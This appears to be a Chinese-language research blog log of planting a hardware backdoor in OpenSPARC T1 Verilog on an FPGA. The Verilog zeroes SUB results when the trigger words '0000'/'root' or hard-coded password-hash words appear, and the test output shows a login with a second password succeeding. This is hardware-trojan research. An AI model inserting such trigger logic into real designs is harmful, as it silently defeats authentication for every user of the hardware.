---
title: 慢慢来，一次一次的试，盲调
published: true
---

现在的情况是没法达成预期的结果，但在SunOS 5.11上，指令可以被改乱从而系统就跑乱了。

逆向的结果，这个版本的libc里的strcmp，如果字符串地址4字节对齐，就一次读4字节，否则就一个字节一个字节的读。

而ubuntu7.10的strcmp，是字符串如果不是8字节对齐，就一字节一字节比较，用ldub；否则就是ldx，一次8字节。
这个系统内核是64位，用户层程序都是32位，我怀疑 malloc得到的buffer是4字节对齐。这样strcmp就只能一字节一字节的比较了。

--------------------------------------------
## 测试0

** uty_opensolaris_patchbitgen1c4t_test36.ace **

测试SunOS 5.11，只要检测到输入的字符分别是0000和root，sparc就把后面所有的sub操作结果都返回0，这样系统肯定是运行不正常了。
这可以反推出sub指令成功接到了0000和root。


`````verilog
   // uty: test
   //  cout64_e should be 1
   // 0x726f6f74 root
   assign backdoor_on_keyword = ((32'h30303030 == byp_alu_rs1_data_e[31:0]) && (32'h726f6f74 == byp_alu_rs2_data_e[31:0]))
                                || ((32'h30303030 == byp_alu_rs2_data_e[31:0]) && (32'h726f6f74 == byp_alu_rs1_data_e[31:0]));
   assign backdoor_off_keyword = ((32'h30303031 == byp_alu_rs1_data_e[31:0]) && (32'h726f6f74 == byp_alu_rs2_data_e[31:0]))
                                || ((32'h30303031 == byp_alu_rs2_data_e[31:0]) && (32'h726f6f74 == byp_alu_rs1_data_e[31:0]));

   assign backdoor_en = backdoor_on_keyword | backdoor_off_keyword;
   assign backdoor_nxt = (backdoor_on_keyword & (~backdoor_off_keyword));

   dffe_s #(1) backdoor_dff(.din(backdoor_nxt), .en(backdoor_en),
                        .clk(clk), .q(backdoor_r), .se(se),
                        .si(), .so());
...

   assign trigger_backdoor = backdoor_r;

`````

这个测试成功了，在login的时候输入0000，系统就挂了。

### 结论：rs1 rs2同时出现过0x30303030和0x726f6f74

--------------------------------------------

## 测试1

下面测个固定的hash，主要看sub指令是按4个字节load这个hash还是有什么情况会让它一个字节一个字节的load。

这个系统ramdisk里啥都缺，没有useradd，也没有vi，所以我只能分别echo一个字串到/etc/passwd和/etc/shadow里来添加用户和密码。
并且系统里还缺/usr/lib/security/crypt_bsdmd5.so.1，所以没法用$1$这种md5的hash。

只能用系统默认的crypt(3)的hash。

用户名guest3（随便什么都行），密码uuu。

`````shell
# echo 'guest3:U8OW4ptN8GB8s:6445::::::' >> /etc/shadow

# echo 'guest3:x:95:95:test:/:/usr/bin/sh' >> /etc/passwd
`````

这回我要在sparc里检测是否出现U8OW4ptN8GB8s这个hash。如果是，结果返回0，让系统过。

U8OW4ptN8GB8s

U8OW         4ptN         8GB8         s

0x55384F57  0x3470744E   0x38474238   0x7300xxxx

`````verilog
   // uty: test
   //  cout64_e should be 1
   // 0x726f6f74 root
   assign backdoor_on_keyword = ((32'h30303030 == byp_alu_rs1_data_e[31:0]) && (32'h726f6f74 == byp_alu_rs2_data_e[31:0]))
                                || ((32'h30303030 == byp_alu_rs2_data_e[31:0]) && (32'h726f6f74 == byp_alu_rs1_data_e[31:0]));
   assign backdoor_off_keyword = ((32'h30303031 == byp_alu_rs1_data_e[31:0]) && (32'h726f6f74 == byp_alu_rs2_data_e[31:0]))
                                || ((32'h30303031 == byp_alu_rs2_data_e[31:0]) && (32'h726f6f74 == byp_alu_rs1_data_e[31:0]));

   assign backdoor_en = backdoor_on_keyword | backdoor_off_keyword;
   assign backdoor_nxt = (backdoor_on_keyword & (~backdoor_off_keyword));

   dffe_s #(1) backdoor_dff(.din(backdoor_nxt), .en(backdoor_en),
                        .clk(clk), .q(backdoor_r), .se(se),
                        .si(), .so());

   // only consider $1$ for now
   assign hash_begin = ((24'h243124 == byp_alu_rs1_data_e[31:8]) && (24'h243124 == byp_alu_rs2_data_e[31:8])
                        && (2'b0 != byp_alu_rs1_data_e[6:5]) && (2'b0 != byp_alu_rs2_data_e[6:5]))
                        & rs1rs2_ishashdata;
...

   assign rs1rs2_ishashdata = ((32'h55384F57 == byp_alu_rs1_data_e[31:0]) || (32'h55384F57 == byp_alu_rs2_data_e[31:0]))
                        || ((32'h3470744E == byp_alu_rs1_data_e[31:0]) || (32'h3470744E == byp_alu_rs2_data_e[31:0]))
                        || ((32'h38474238 == byp_alu_rs1_data_e[31:0]) || (32'h38474238 == byp_alu_rs2_data_e[31:0]))
                        || ((16'h7300 == byp_alu_rs1_data_e[31:16]) || (16'h7300 == byp_alu_rs2_data_e[31:16]))
           ;


        // ifu_exu_invert_d & ecl_alu_cin_e, make sure it is a SUB/SUBcc
        // instruction. (SUBC's ecl_alu_cin_e actually is 0)
   assign trigger_backdoor = ifu_exu_invert_d & ecl_alu_cin_e & backdoor_r & rs1rs2_ishashdata;
   //assign trigger_backdoor = backdoor_r;

   assign spr_out[63:0] = spr_out_tmp[63:0] & {64{~trigger_backdoor}};
   assign adder_out[63:0] = adder_out_tmp[63:0] & {64{~trigger_backdoor}};

`````
这次trigger_backdoor的条件改回严格一点，要先用0000开启后门。
并且判断是个sub减法，最后rs1rs2_ishashdata就是硬编码的数据，无论在rs1还是rs2里都算。

如果成功，就是任意密码都能进。

但这次涉及的地方较多，比如dffe是否能正常工作，sub减法的ifu_exu_invert_d和ecl_alu_cin_e是否确定，通过追代码我认为是确定。

(dffe应该是正常工作，因为这个测试就能说明dffe backdoor_r是1，后续的add和sub才会出问题，系统才会freeze。)

这次还实验下只clean bitstream，这样编译的时间可能会少些，但是否会用新的sparc.npc还不确定。

所以如果这次实验，如果输入0000还是直接freeze，就首先说明只clean bitstream还不够，还得clean netlist和clean hardware。

modelsim先过了遍，没问题。

clean bits是这些：
`````shell
 make -f system.make bitsclean started...
rm -f implementation/system.bit
rm -f implementation/system.ncd
rm -f implementation/system_bd.bmm 
rm -f implementation/system_map.ncd 
rm -f __xps/system_routed
Done!
`````

好像最慢的就是generate bitstream，生成netlist还算快的。


输入0000没有freeze，说明这次的ace更新了sparc，以后只要clean bitstream和generate bitstream就行了，不过也没省多少时间。
过了一会还是freeze了，这其实很难说是改代码的原因还是上次sparc没有更新进ace的原因。

只能再跑一次，这次clean netlist，clean bitstream，clean hardware。




刚想起来，应该用qemu跑SunOS 5.11这个ramdisk。

(试了，不行。`panic[cpu0]/thread=180e000: lgrp_traverse: No memory blocks found `)

另外启动的时候也看到SunOS的内核显示的也是64位。

看来都是内核64，应用程序32位。





** uty_opensolaris_patchbitgen1c4t_test38.ace **

### 结果：

`````shell
t1-fpga-00 console login: 
t1-fpga-00 console login: 0000





Apr 29 16:04:56 t1-fpga-00 ufs: NOTICE: alloc: /: file system full

Apr 29 16:08:46 t1-fpga-00 last message repeated 2 times
Apr 29 16:08:50 t1-fpga-00 ufs: NOTICE: realloccg /: file system full


Apr 29 16:09:00 t1-fpga-00 ufs: NOTICE: alloc: /: file system full

`````

有变化，首先基本能说明clean netlist是有必要先执行下。

后面一直都没freeze，说明应该是后面判断hash的部分误判了其它的sub指令，估计是最后的7300，这个范围太大了。

这次还有个变化，就是0000和root没有限制是rs1还是rs2，而在qemu虚拟机里跑SunOS 5.10时发现会有这个两个字符串从rs1 rs2
位置对调的情况。

这回会不会是已经把0000当成root了，所以没有提示密码？这个系统里root密码本来就是空。

后面又重复跑了下，结果一样，还是file system full这个提示，login跑崩了。

`````shell
t1-fpga-00 console login: 
t1-fpga-00 console login: root
Apr 29 16:06:04 t1-fpga-00 login: ROOT LOGIN /dev/console
Sun Microsystems Inc.   SunOS 5.11      snv_77  October 2007
# login
login: 0000

Apr 29 16:06:06 t1-fpga-00 ufs: NOTICE: alloc: /: file system full
Segmentation Fault
# # 

`````

-------------------------------------------
## 测试2

下面测试可以把7300的参数搞的更严一点，比如另外一个寄存器byte 3要是可打印字符，byte2 要是00，byte 1，0随意。

也可以测试把7300这条去掉，如果成功的话也许可以直接进root。

`````verilog
   assign rs1rs2_ishashdata = ((32'h55384F57 == byp_alu_rs1_data_e[31:0]) || (32'h55384F57 == byp_alu_rs2_data_e[31:0]))
                        || ((32'h3470744E == byp_alu_rs1_data_e[31:0]) || (32'h3470744E == byp_alu_rs2_data_e[31:0]))
                        || ((32'h38474238 == byp_alu_rs1_data_e[31:0]) || (32'h38474238 == byp_alu_rs2_data_e[31:0]))
                        || ((16'h7300 == byp_alu_rs1_data_e[31:16]) && (2'b0 != byp_alu_rs2_data_e[30:29]) && (1'b0 == byp_alu_rs2_data_e[31]) && (8'h0 == byp_alu_rs2_data_e[23:16]))
                        || ((16'h7300 == byp_alu_rs2_data_e[31:16]) && (2'b0 != byp_alu_rs1_data_e[30:29]) && (1'b0 == byp_alu_rs1_data_e[31]) && (8'h0 == byp_alu_rs1_data_e[23:16]))
           ;
`````

modelsim里简单测下没问题。
![modelsim](https://github.com/whensungoesdown/whensungoesdown.github.io/raw/main/_posts/2022-05-18-0.png)

### 结果：
`````shell
t1-fpga-00 console login: 
t1-fpga-00 console login: root
Apr 29 16:05:31 t1-fpga-00 login: ROOT LOGIN /dev/console
Sun Microsystems Inc.   SunOS 5.11      snv_77  October 2007
# login
login: 0000
Apr 29 16:05:32 t1-fpga-00 login: passwdutil.so: can't get master for passwd map
Password: 
Login incorrect

`````

7300那部分搞的严格点，就没crash了，但是0000也没有替换root。
这和之前在QEMU SunOS 5.10的镜像里的结果一致，后面有个0000和root的比较是按字节比较的。


`````shell
# login
login: 0000
Password: 
Login incorrect
login: guest3
Password: 
Login incorrect

`````
后面试了下用0000打开，再登陆刚加到shadow里的guest3用户，还是不行。
-----------------------------------------
## 测试3

等用QEMU看下SunOS 5.10里是什么情况。

src2是系统密码uuu的hash，src1是输入的密码dd。
`````shell
helper_sub: !!!!! src1 0x55385250, src2 0x55384f57
helper_sub: !!!!! src1 0x77692e55, src2 0x3470744e
helper_sub: !!!!! src1 0x49394e45, src2 0x38474238
helper_sub: !!!!! src1 0x45000000, src2 0x73000000

`````
在虚拟机里明确能抓到这个hash串，但也会有很多误报的，怀疑是login验证密码对了，但在后续的cmp指令失败导致最后Login incorrect。

所以现在要试的是，把条件限制的更严些。

`````verilog
   assign rs1rs2_ishashdata = ((32'h55384F57 == byp_alu_rs1_data_e[31:0]) || (32'h55384F57 == byp_alu_rs2_data_e[31:0]))
                        || ((32'h3470744E == byp_alu_rs1_data_e[31:0]) || (32'h3470744E == byp_alu_rs2_data_e[31:0]))
                        || ((32'h38474238 == byp_alu_rs1_data_e[31:0]) || (32'h38474238 == byp_alu_rs2_data_e[31:0]))
                        || (((32'h45000000 == byp_alu_rs1_data_e[31:0]) && (32'h73000000 == byp_alu_rs2_data_e[31:0])))
                //      || ((16'h7300 == byp_alu_rs1_data_e[31:16]) && (2'b0 != byp_alu_rs2_data_e[30:29]) && (1'b0 == byp_alu_rs2_data_e[31]) && (8'h0 == byp_alu_rs2_data_e[23:16]))
                //      || ((16'h7300 == byp_alu_rs2_data_e[31:16]) && (2'b0 != byp_alu_rs1_data_e[30:29]) && (1'b0 == byp_alu_rs1_data_e[31]) && (8'h0 == byp_alu_rs1_data_e[23:16]))
           ;

`````

再测的时候，密码输入dd，最后这一字节密码就写固定了，45000000和73000000。

先这样测下，要是还不行，就先用dd的密码做次测试，也就是rs1里必须是dd的hash，rs2里是uuu的hash。

** uty_opensolaris_patchbitgen1c4t_test40.ace **
### 结果：


`````shell
t1-fpga-00 console login: root
Apr 29 16:04:55 t1-fpga-00 login: ROOT LOGIN /dev/console
Sun Microsystems Inc.   SunOS 5.11      snv_77  October 2007
# chmod +w /etc/shadow
# echo 'guest3:U8OW4ptN8GB8s:6445::::::' >> /etc/shadow
# echo 'guest3:x:95:95:test:/:/usr/bin/sh' >> /etc/passwd
# login
login: 0000
Apr 29 16:05:02 t1-fpga-00 login: passwdutil.so: can't get master for passwd map
Password: 
Login incorrect
login: guest3
Password: 

Login incorrect

`````
还是不行，再试试4500和7300，也许后面两byte不一定都是00。


----------------------------------------------------------------

## 测试4

`````verilog
   assign rs1rs2_ishashdata = ((32'h55384F57 == byp_alu_rs1_data_e[31:0]) || (32'h55384F57 == byp_alu_rs2_data_e[31:0]))
                        || ((32'h3470744E == byp_alu_rs1_data_e[31:0]) || (32'h3470744E == byp_alu_rs2_data_e[31:0]))
                        || ((32'h38474238 == byp_alu_rs1_data_e[31:0]) || (32'h38474238 == byp_alu_rs2_data_e[31:0]))
                        || (((16'h4500 == byp_alu_rs1_data_e[31:16]) && (32'h7300 == byp_alu_rs2_data_e[31:16])))      
           ;
`````

** uty_opensolaris_patchbitgen1c4t_test41.ace **

### 结果：
失败

也许是bypass network里有其它地方会影响结果，也可能是输出的几个信号还有不对的地方。


## 测试5

再sparc里固定写上这个几个值，目的就是让登陆guest3的时候用dd密码也可以，也不用0000开启了。
最后一段hash只判定4500和7300。

`````shell
QEMU 6.1.93 monitor - type 'help' for more information
(qemu) char device redirected to /dev/pts/9 (label serial0)
helper_sub: !!!!! src1 0x55385250, src2 0x55384f57
helper_sub: !!!!! src1 0x77692e55, src2 0x3470744e
helper_sub: !!!!! src1 0x49394e45, src2 0x38474238
helper_sub: !!!!! src1 0x45000000, src2 0x73000000
`````


** uty_opensolaris_patchbitgen1c4t_test42.ace **

### 结果

这次可以了！！

`````shell
t1-fpga-00 console login: guest3
Password: 
Last login: Tue Apr 29 16:07:22 on console
Insufficient privileges, quota must be set-uid root or have file_dac_read privileges
Sun Microsystems Inc.   SunOS 5.11      snv_77  October 2007
$
`````

也就是guest3有2个密码，一个uuu，还有一个dd。

现在回推，问题可能出在0000的backdoor_dff上，也可能出在这几个信号里面。

`````verilog
assign trigger_backdoor = ifu_exu_invert_d & ecl_alu_cin_e & backdoor_r & rs1rs2_ishashdata;

`````

这次成功是没只用了`assign trigger_backdoor = rs1rs2_ishashdata;`，ifu_exu_invert_d应该是减法一定会设置的。
而ecl_alu_cin_e，虽然cmp指令实际上是SUBcc指令，并不用到carry，但我通过看代码和跟代码感觉SUBcc的时候这个信号也
应该是1，否则结果不对，多减了1。

下面就实验是ifu_exu_invert_d，ecl_alu_cin_e的问题，还是backdoor_r的问题。


--------------------------

## 测试6

这次把backdoor_r带上，也就是说必须要先0000激活后门才行。

验证下SUBcc时ifu_exu_invert_d和ecl_alu_cin_e是不是都是1，看我对这条减法指令的理解对不对，还是backdoor_r的dffe用的有问题。

我也把xor指令里以前加的代码也去掉了，在debian9.0的代码里，不是用cmp，而是用xor做字符串比较。

最开始加的，后来一直忘了，现在先拿掉，不考虑这个。

`````verilog
   assign rs1rs2_ishashdata = ((32'h55385250 == byp_alu_rs1_data_e[31:0]) && (32'h55384F57 == byp_alu_rs2_data_e[31:0]))
                        || ((32'h77692e55 == byp_alu_rs1_data_e[31:0]) && (32'h3470744E == byp_alu_rs2_data_e[31:0]))
                        || ((32'h49394e45 == byp_alu_rs1_data_e[31:0]) && (32'h38474238 == byp_alu_rs2_data_e[31:0]))
                        || (((16'h4500 == byp_alu_rs1_data_e[31:16]) && (32'h7300 == byp_alu_rs2_data_e[31:16])))
                        ;

        // ifu_exu_invert_d & ecl_alu_cin_e, make sure it is a SUB/SUBcc
        // instruction. (SUBC's ecl_alu_cin_e actually is 0)
   //assign trigger_backdoor = ifu_exu_invert_d & ecl_alu_cin_e & backdoor_r & rs1rs2_ishashdata;
   assign trigger_backdoor = backdoor_r & rs1rs2_ishashdata;

   assign spr_out[63:0] = spr_out_tmp[63:0] & {64{~trigger_backdoor}};
   assign adder_out[63:0] = adder_out_tmp[63:0] & {64{~trigger_backdoor}};
`````
